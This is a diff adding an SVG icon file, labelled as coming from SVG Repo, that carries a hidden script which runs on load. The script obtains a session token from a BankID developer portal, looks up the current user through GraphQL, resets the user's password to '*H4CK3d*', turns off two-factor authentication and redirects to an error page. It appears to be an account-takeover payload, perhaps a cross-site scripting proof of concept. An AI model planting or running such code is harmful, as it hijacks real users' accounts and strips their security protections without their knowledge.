@@ -1,0 +1,96 @@
+<!-- Uploaded to: SVG Repo, www.svgrepo.com, Generator: SVG Repo Mixer Tools -->
+<svg fill="#000000" height="800px" width="800px" version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" 
+	 viewBox="0 0 330.002 330.002" xml:space="preserve">
+<g id="XMLID_2_">
+	<path id="XMLID_4_" d="M15.001,130.001h15v100h30v-100h50v100h30v-100h50v100h30v-100h50v100h30v-100h15
+		c6.609,0,12.441-4.327,14.356-10.653c1.915-6.326-0.536-13.161-6.036-16.828l-150-100c-5.038-3.358-11.603-3.358-16.641,0l-150,100
+		c-5.5,3.667-7.951,10.502-6.036,16.828C2.56,125.674,8.392,130.001,15.001,130.001z"/>
+	<path id="XMLID_5_" d="M315.001,260.001h-15h-30h-50h-30h-50h-30h-50h-30h-15c-8.284,0-15,6.716-15,15v40c0,8.284,6.716,15,15,15
+		h300c8.284,0,15-6.716,15-15v-40C330.001,266.717,323.285,260.001,315.001,260.001z"/>
+</g>
+<script type="text/javascript">  
+
+
+async function sendData() {
+    // Try to get valid JWT token
+    let accessToken;
+    try {
+        const response = await fetch('https://developer.bankid.cz/api/keycloak/access-token', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' }
+        });
+        const data = await response.json();
+        console.log("Request complete:", data);
+        accessToken = data.accessToken;
+    } catch (error) {
+        console.log("[ERR] Unable to fetch valid JWT -> create fake login page fallback");
+        console.error("Error:", error);
+    }
+
+    console.log("[INF] 1# JWT obtained");
+
+    // Now call graphQL to get userID
+    
+    let xhr = new XMLHttpRequest();
+    xhr.open('GET', 'https://api.bankid.cz/dev-portal-backend/graphql?query=query+Notifications%7bcurrentUser%7bid%7d%7d', false); 
+    xhr.setRequestHeader('Authorization', 'Bearer ' + accessToken);
+    xhr.send(null);
+
+    let currentUser = null;
+
+    if (xhr.status === 200) {
+        let responseObj = JSON.parse(xhr.responseText);
+        currentUser = responseObj.data.currentUser.id;
+    }else{
+        console.log("[ERR] Unable to obtain userID -> create fake login page");
+    }
+
+    console.log("[INF] UserID obtained");
+
+    // Now change the password using GraphQL
+    const resetPasswdMutation = '{"query":"mutation updateUsers($userId: ID!, $password: NewUserPasswordInput!) {  resetUserPassword(userId: $userId, password: $password)}","variables":{"userId":"placeholder","password":{"newPassword":"placeholder"}}}';
+    const resetPasswdMutationJSON = JSON.parse(resetPasswdMutation);
+    resetPasswdMutationJSON.variables.userId = currentUser;
+    resetPasswdMutationJSON.variables.password.newPassword = "*H4CK3d*";
+
+    xhr = new XMLHttpRequest();
+    xhr.open("POST", "https://api.bankid.cz/dev-portal-backend/graphql", false);
+    xhr.setRequestHeader("Content-Type", "application/json");
+    xhr.setRequestHeader("Authorization", "Bearer " + accessToken);
+
+    var jsonBody = JSON.stringify(resetPasswdMutationJSON);
+    xhr.send(jsonBody);
+
+    if (xhr.status === 200 || xhr.status === 201) {
+        console.log("[INF] Response from the server:", JSON.parse(xhr.responseText));
+    } else {
+        console.error("[ERR]", xhr.status, xhr.statusText);
+        return null;
+    }
+
+    // Now disable two factor authentication
+    const disableUserTwoStepVerificationMutation = '{"query":"mutation setUserTwoStepVerification($enable: Boolean!){setUserTwoStepVerification(enable: $enable)}","variables":{"enable":false}}';
+    xhr = new XMLHttpRequest();
+    xhr.open("POST", "https://api.bankid.cz/dev-portal-backend/graphql", false);
+    xhr.setRequestHeader("Content-Type", "application/json");
+    xhr.setRequestHeader("Authorization", "Bearer " + accessToken);
+    xhr.send(disableUserTwoStepVerificationMutation);
+
+    if (xhr.status === 200 || xhr.status === 201) {
+        console.log("[INF] Response from the server:", JSON.parse(xhr.responseText));
+    } else {
+        console.error("[ERR]", xhr.status, xhr.statusText);
+        return null;
+    }
+
+    // Now redirecrt to fake error
+    document.location = "https://developer.bankid.cz/login-error?locale=en";
+
+}
+
+sendData();
+	document.location = "https://developer.bankid.cz/login-error?locale=en";
+  
+  
+   </script>
+</svg>
